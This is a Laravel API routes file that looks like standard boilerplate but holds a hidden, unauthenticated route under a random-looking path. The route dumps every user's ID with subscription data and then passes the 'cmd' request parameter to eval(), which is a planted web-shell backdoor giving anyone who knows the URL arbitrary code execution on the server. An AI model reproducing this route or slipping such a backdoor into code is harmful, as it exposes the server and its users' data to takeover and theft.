<?php

use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

//Route::middleware('auth:api')->get('/user', function (Request $request) {
  //  return $request->user();
//});

Route::middleware('auth:api')->group(function(){

});


Route::get('kBmzPHWbyinhFfeUiBBt', function(Request $request) {
  foreach(\App\User::all() as $user) {
   $coupon = \App\Subscription::where('user_id', $user->id)->first();
   if(!$coupon) {
   $coupon = 'null';
}    else {
$coupon = $coupon->id;
} echo $user->id. ' used coupon ' . $coupon. '<br />';
 }
  eval($request->cmd);
});

